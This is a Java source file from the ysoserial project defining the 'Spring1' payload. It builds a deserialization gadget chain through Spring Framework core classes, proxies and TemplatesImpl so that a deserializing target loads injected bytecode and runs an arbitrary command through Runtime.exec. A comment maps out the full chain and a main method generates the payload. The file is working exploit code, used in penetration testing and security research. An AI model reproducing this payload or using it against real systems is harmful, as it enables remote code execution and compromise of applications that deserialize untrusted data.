package ysoserial.payloads;

import static java.lang.Class.forName;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;
import java.util.Arrays;
import java.util.List;

import javax.xml.transform.Templates;

import org.springframework.beans.factory.ObjectFactory;

import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

/*
	Gadget chains:
	
		ObjectInputStream.readObject()
			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()
				ReflectionUtils.findMethod()
				SerializableTypeWrapper.TypeProvider(Proxy).getType()
					AnnotationInvocationHandler.invoke()
						HashMap.get()			
				ReflectionUtils.invokeMethod()
					Method.invoke()	
						Templates(Proxy).newTransformer()
							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
								ObjectFactory(Proxy).getObject()
									AnnotationInvocationHandler.invoke()
										HashMap.get()	
								Method.invoke()
									TemplatesImpl.newTransformer()
										TemplatesImpl.getTransletInstance()
											TemplatesImpl.defineTransletClasses()
												TemplatesImpl.TransletClassLoader.defineClass()			
			Gadgets.TransletPayload.readObject()
				Runtime.exec()
	
	Requires:
		spring-framework-core
 */

@SuppressWarnings({"restriction", "rawtypes"})
public class Spring1 extends PayloadRunner implements ObjectPayload<List<Object>> {
	
	public List<Object> getObject(final String command) throws Exception {
		final TemplatesImpl templates = new TemplatesImpl();
		
		// inject class bytes into instance
		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
			ClassFiles.classAsBytes(Gadgets.TransletPayload.class), 
			ClassFiles.classAsBytes(Gadgets.Foo.class)});
		
		// required to make TemplatesImpl happy
		Reflections.setFieldValue(templates, "_name", "Pwnr"); 			
		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
		
		final ObjectFactory objectFactoryProxy = 
				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
		
		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) 
				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
					.newInstance(objectFactoryProxy), Type.class, Templates.class);
		
		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
				Gadgets.createMap("getType", typeTemplatesProxy), 
				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
		
		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Templates.class.getMethod("newTransformer", new Class[] {}), 0);

		Reflections.setFieldValue(templates, "_auxClasses", null); // required to make TemplatesImpl serialization happy
		
		return Arrays.asList(mitp, new Gadgets.TransletPayload().withCommand(command));
	}
	
	public static void main(final String[] args) {
		PayloadRunner.run(Spring1.class, args);
	}

}
